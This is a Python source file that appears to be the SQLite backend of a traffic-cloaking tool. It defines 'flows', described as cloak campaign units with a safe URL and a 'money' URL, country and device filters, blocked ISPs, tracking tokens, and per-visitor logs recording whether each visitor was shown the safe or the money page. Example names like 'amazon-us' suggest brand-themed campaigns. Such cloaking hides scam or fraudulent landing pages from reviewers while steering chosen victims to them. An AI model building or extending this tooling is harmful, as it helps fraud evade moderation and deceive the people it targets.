"""
Single source of truth for all database tables.
Uses raw SQLite via a thread-safe connection helper.

Primary concept: a "Flow" is a named cloak campaign unit.
  flow_name  → human name  (e.g. "parkside-fr", "amazon-us")
  domain     → the actual domain visitors hit
"""
import sqlite3
import secrets
import string
from contextlib import contextmanager
from config import DATABASE_URL

_DB_PATH = DATABASE_URL.replace("sqlite:///", "")


@contextmanager
def get_conn():
    c = sqlite3.connect(_DB_PATH, check_same_thread=False)
    c.row_factory = sqlite3.Row
    try:
        yield c
        c.commit()
    finally:
        c.close()


def _migrate(c):
    """Safe column additions for existing databases."""
    existing = {row[1] for row in c.execute("PRAGMA table_info(flows)")}
    migrations = {
        "device_filter": "TEXT DEFAULT 'all'",
    }
    for col, definition in migrations.items():
        if col not in existing:
            c.execute(f"ALTER TABLE flows ADD COLUMN {col} {definition}")


def init_db():
    with get_conn() as c:
        c.executescript("""
            CREATE TABLE IF NOT EXISTS flows (
                flow_name       TEXT PRIMARY KEY,
                domain          TEXT    NOT NULL DEFAULT '',
                safe_url        TEXT    DEFAULT '',
                money_url       TEXT    DEFAULT '',
                countries       TEXT    DEFAULT '',
                threshold       INTEGER DEFAULT 20000,
                blocked_isps    TEXT    DEFAULT '',
                device_filter   TEXT    DEFAULT 'all',
                notify_group    TEXT    DEFAULT '',
                notify_enabled  INTEGER DEFAULT 0,
                notify_level    TEXT    DEFAULT 'all',
                created_at      DATETIME DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS links (
                token       TEXT PRIMARY KEY,
                flow_name   TEXT    NOT NULL,
                domain      TEXT    NOT NULL,
                active      INTEGER DEFAULT 1,
                created_at  DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY(flow_name) REFERENCES flows(flow_name) ON DELETE CASCADE
            );

            CREATE TABLE IF NOT EXISTS visits (
                id           INTEGER PRIMARY KEY AUTOINCREMENT,
                flow_name    TEXT,
                domain       TEXT,
                token        TEXT,
                ip           TEXT,
                country      TEXT,
                country_code TEXT,
                isp          TEXT,
                action       TEXT,
                proxy        INTEGER DEFAULT 0,
                device_type  TEXT    DEFAULT '',
                os           TEXT    DEFAULT '',
                created_at   DATETIME DEFAULT CURRENT_TIMESTAMP
            );
        """)
        _migrate(c)


# ── Token helper ──────────────────────────────────────────────────────────────

def _make_token(n: int = 8) -> str:
    return "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(n))


# ── Flow CRUD ─────────────────────────────────────────────────────────────────

def flow_add(flow_name: str) -> bool:
    from config import DEFAULT_BLOCKED_ISPS
    default_isps = "|".join(DEFAULT_BLOCKED_ISPS)
    try:
        with get_conn() as c:
            c.execute(
                "INSERT INTO flows (flow_name, blocked_isps) VALUES (?, ?)",
                (flow_name, default_isps),
            )
        return True
    except sqlite3.IntegrityError:
        return False


def flow_remove(flow_name: str) -> bool:
    with get_conn() as c:
        cur = c.execute("DELETE FROM flows WHERE flow_name = ?", (flow_name,))
        return cur.rowcount > 0


def flow_list():
    with get_conn() as c:
        return c.execute("SELECT * FROM flows ORDER BY flow_name").fetchall()


def flow_get(flow_name: str):
    with get_conn() as c:
        return c.execute("SELECT * FROM flows WHERE flow_name = ?", (flow_name,)).fetchone()


def flow_get_by_domain(domain: str):
    with get_conn() as c:
        return c.execute("SELECT * FROM flows WHERE domain = ?", (domain,)).fetchone()


def flow_update(flow_name: str, **fields) -> bool:
    if not fields:
        return False
    cols = ", ".join(f"{k} = ?" for k in fields)
    vals = list(fields.values()) + [flow_name]
    with get_conn() as c:
        cur = c.execute(f"UPDATE flows SET {cols} WHERE flow_name = ?", vals)
        return cur.rowcount > 0


# ── Links CRUD ────────────────────────────────────────────────────────────────

def link_create(flow_name: str, domain: str) -> str:
    token = _make_token()
    with get_conn() as c:
        c.execute(
            "INSERT INTO links (token, flow_name, domain) VALUES (?, ?, ?)",
            (token, flow_name, domain),
        )
    return token


def link_revoke_all(flow_name: str):
    with get_conn() as c:
        c.execute("UPDATE links SET active = 0 WHERE flow_name = ?", (flow_name,))


def link_list(flow_name: str):
    with get_conn() as c:
        return c.execute(
            "SELECT token, domain, created_at FROM links WHERE flow_name = ? AND active = 1 ORDER BY created_at DESC",
            (flow_name,),
        ).fetchall()


def link_get_flow(token: str):
    """Returns (flow_name, domain) tuple or (None, None)."""
    with get_conn() as c:
        row = c.execute(
            "SELECT flow_name, domain FROM links WHERE token = ? AND active = 1", (token,)
        ).fetchone()
        return (row["flow_name"], row["domain"]) if row else (None, None)


# ── Visits ────────────────────────────────────────────────────────────────────

def visit_log(flow_name, domain, token, ip, country, country_code, isp, action, proxy=0, device_type="", os=""):
    with get_conn() as c:
        c.execute(
            """INSERT INTO visits
               (flow_name, domain, token, ip, country, country_code, isp, action, proxy, device_type, os)
               VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
            (flow_name, domain, token, ip, country, country_code, isp, action, int(proxy), device_type, os),
        )


def visit_logs(flow_name: str, limit: int = 20):
    with get_conn() as c:
        return c.execute(
            "SELECT * FROM visits WHERE flow_name = ? ORDER BY created_at DESC LIMIT ?",
            (flow_name, limit),
        ).fetchall()


def visit_stats(flow_name: str) -> dict:
    with get_conn() as c:
        total = c.execute("SELECT COUNT(*) FROM visits WHERE flow_name = ?", (flow_name,)).fetchone()[0]
        money = c.execute("SELECT COUNT(*) FROM visits WHERE flow_name = ? AND action = 'money'", (flow_name,)).fetchone()[0]
        safe  = c.execute("SELECT COUNT(*) FROM visits WHERE flow_name = ? AND action = 'safe'",  (flow_name,)).fetchone()[0]
    return {"total": total, "money": money, "safe": safe}
